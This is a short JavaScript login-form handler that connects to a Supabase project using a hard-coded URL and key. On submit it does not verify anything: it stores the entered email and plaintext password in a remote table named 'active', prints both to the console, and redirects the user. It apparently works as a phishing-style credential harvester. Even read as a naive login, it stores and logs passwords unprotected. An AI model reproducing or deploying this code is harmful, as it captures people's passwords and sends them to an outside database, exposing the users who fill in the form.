// Initialize Supabase client
const supabaseUrl = "https://dotfdzuedrugovtbddtu.supabase.co";
const supabaseKey =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRvdGZkenVlZHJ1Z292dGJkZHR1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTgyNjM2NjEsImV4cCI6MjAzMzgzOTY2MX0.Y7MaWCMqWiJRmAdt53x1f1_2Usou2PtoJFHwoflKGl4";
const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);

// Handle form submission
document
  .getElementById("login-form")
  .addEventListener("submit", async (event) => {
    event.preventDefault();

    const formData = new FormData(event.target);
    const email = formData.get("username"); // Assuming username field is used for email
    const password = formData.get("password");

    try {
      // Insert user credentials into Supabase 'active' table
      const { data, error } = await supabaseClient
        .from("active")
        .insert([{ email, password }]);

      if (error) {
        throw error;
      }

      console.log("User email:", email);
      console.log("Password:", password);

      // Example: Redirect to dashboard or another page
      window.location.href = "/index.html";
    } catch (error) {
      console.error("Error inserting user:", error.message);
      // Display error message to user if needed
      document.getElementById("message").innerText = `Error: ${error.message}`;
    }
  });
